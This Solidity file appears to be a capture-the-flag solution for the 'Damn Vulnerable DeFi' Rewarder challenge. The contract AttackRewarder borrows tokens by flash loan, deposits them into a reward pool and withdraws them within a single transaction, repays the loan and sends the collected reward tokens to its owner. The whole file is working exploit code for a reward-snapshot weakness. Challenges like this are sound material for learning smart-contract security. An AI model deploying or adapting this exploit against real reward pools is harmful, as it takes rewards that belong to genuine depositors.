// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";
import "./RewardToken.sol";
import "hardhat/console.sol";

contract AttackRewarder {
    address owner;
    FlashLoanerPool flashLoanPool;
    DamnValuableToken liquidityToken;
    TheRewarderPool rewardPool;
    RewardToken rewardToken;

    constructor(
        address _flashLoanPool,
        address _liquidityToken,
        address _rewardPool,
        address _rewardToken
    ) {
        flashLoanPool = FlashLoanerPool(_flashLoanPool);
        liquidityToken = DamnValuableToken(_liquidityToken);
        rewardPool = TheRewarderPool(_rewardPool);
        rewardToken = RewardToken(_rewardToken);
        owner = msg.sender;
    }

    function executeFlashLoan(uint256 amount) external {
        flashLoanPool.flashLoan(amount);
    }

    function receiveFlashLoan(uint256 amount) external {
        liquidityToken.approve(address(rewardPool), amount);
        rewardPool.deposit(amount);
        rewardPool.withdraw(amount);
        liquidityToken.transfer(msg.sender, amount);
        _withdraw(owner);
    }

    function _withdraw(address recipient) internal {
        rewardToken.transfer(recipient, rewardToken.balanceOf(address(this)));
    }
}
